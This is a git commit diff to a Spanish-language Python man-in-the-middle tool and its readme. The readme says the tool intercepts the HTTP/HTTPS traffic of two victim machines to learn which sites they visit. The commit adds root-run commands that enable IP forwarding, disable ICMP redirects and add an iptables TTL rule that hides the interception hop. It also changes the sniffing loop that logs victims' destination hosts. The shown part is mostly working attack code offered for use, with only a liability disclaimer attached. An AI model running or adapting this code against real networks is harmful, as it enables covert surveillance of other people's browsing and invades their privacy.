432ece04b51ccd9f13c19c5a22ecbaf039e4ebd6
Urb4n <matiasurbaneja@hotmail.com.ar>
2025-02-20 21:15:27 -0300

    solucionando problemas

--- mitm.py
+++ mitm.py
@@ -14,7 +14,7 @@ logo = '''
 
 \033[0;32m██    ██ ██████  ██████   ██████  ███    ██ 
 \033[0;32m██    ██ ██   ██ ██   ██ ██    ██ ████   ██ 
-\033[0;34m██    ██ ██████  ██████  ██ ██ ██ ██ ██  ██ 
+\033[0;31m██    ██ ██████  ██████  ██ ██ ██ ██ ██  ██ 
 ██    ██ ██   ██ ██   ██ ██ ██ ██ ██  ██ ██ 
  ██████  ██   ██ ██████   █ ████  ██   ████ 
                                             
@@ -30,7 +30,7 @@ def informacion(paquete):
       ip_http = re.search(r'(\d+\.\d+\.\d+\.\d+):https?',str(paquete)).group(1).strip()
       ip_dts = re.search(r'TCP (\d+\.\d+\.\d+\.\d+):\d+ >',str(paquete)).group(1).strip()
 
-      return [ip_dts,ip_http]
+      return (ip_dts,ip_http)
    except AttributeError:
       pass
 
@@ -39,19 +39,22 @@ def sniffing():
    conf.verb=0
    while ejecutando:
       try:
-         func_sn = sniff(timeout=0.5,filter='tcp and ( port 80 or port 443 )')
+         func_sn = sniff(timeout=1,filter='tcp and ( port 80 or port 443 )')
          
          pqt_1 = informacion(func_sn[0])[1]
          #func_ sn --> se marcan los elementos de la tupla
          pqt_2 = informacion(func_sn[1])[1]
          p1 = informacion(func_sn[1])[0]
          p2 = informacion(func_sn[0])[0]
+         print(Fore.WHITE+'')
+         print(f'\n{gethostbyaddr(pqt_1)[0]} - destinatario {pqt_1} > {p2}\n')
+         print(f'\n{gethostbyaddr(pqt_2)[0]} - ip num > {pqt_2}- destinatario > {p1}\n')
 
-         print(f'\n{gethostbyaddr(pqt_1)[0]} - destinatario > {p2}\n')
-         print(f'\n{gethostbyaddr(pqt_2)[0]} - destinatario > {p1}\n')
-
-      except (IndexError,herror,TypeError):
-         pass   
+      except (IndexError,TypeError):
+         pass  
+      except herror:
+         print(f'\n{pqt_1} - destinatario > {p2}\n')
+         print(f'\n{pqt_2} - destinatario > {p1}\n')
 
       
 
@@ -66,13 +69,18 @@ if __name__ == '__main__':
    print(logo)
    if system() == 'Linux':
       if check_output('whoami',text=True).strip() == 'root': 
-         maq1 = str(input(Fore.WHITE+'maquina A >> '))
-         maq2 = str(input(Fore.WHITE+'maquina B >> '))
-         #esto redirige automaticamente los paquetes de la victima al router para que no se que sin conexion
-         os.system("sysctl net.ipv4.ip_forward=1")
+         maq1 = str(input(Fore.WHITE+'[#] maquina A >> '))
+         maq2 = str(input(Fore.WHITE+'[#] maquina B >> '))     
+         
+         for x in ['sysctl net.ipv4.conf.all.send_redirects=0',
+            'sysctl net.ipv4.ip_forward=1',
+            'iptables -t mangle -A PREROUTING -j TTL --ttl-inc 1']:
+            os.system(x)
+            
+         print('\n\033[0;32miniciando ataque ...\n')
          ejecucion(maq1,maq2)
       else:
-         print('\n\033[0;40;31m[+] no soy root\n')
+         print('\n\033[0;31m[+] no soy root\n')
    else:
-      print('\n\033[0;40;31m[+] sistema operativo incompatible\n')
+      print('\n\033[0;31m[+] sistema operativo incompatible\n')
       input()
--- readme.md
+++ readme.md
@@ -1,11 +1,17 @@
 
+> [!IMPORTANT]
+La herramienta puede debilitar o tirar la conexion de la maquina victima, ademas, el sitema de la victima podria avisarle que se esta llevando a cabo un ataque
+
 ### Descripcion:
 
-este codigo automatiza un ataque de hombre en el medio usando scapy con el objetivo de interceptar paquetes relacionados a protocolos http y https cuyo fin es la obtencion de informacion de los sitios con los que interactuan las maquinas afectadas
+Este codigo automatiza un ataque de hombre en el medio usando scapy con el objetivo de interceptar paquetes relacionados a protocolos http y https cuyo fin es la obtencion de informacion de los sitios con los que interactuan las maquinas afectadas
 
-el script efectua un ataque mitm y posteriormente olfatea o sniffea la red en busca de informacion
+El script efectua un ataque mitm y posteriormente olfatea o sniffea la red en busca de informacion
 
-> [!IMPORTANT]
---> No me hago responsable del mal uso que se le pueda dar a este codigo. El codigo fue hecho con fines de experimentacion, puede fallar y/o tener errores
+Lo que se obtiene son nombres de host o direcciones ip, con esas direcciones se podria recopilar informacion para saber por donde estuvo navegando la victima
+
+
+> [!WARNING]
+--> No me hago responsable del mal uso que se le pueda dar a este codigo. El codigo fue hecho con fines de experimentacion y uso personal , puede fallar y/o tener errores
 
 autor: urb@n
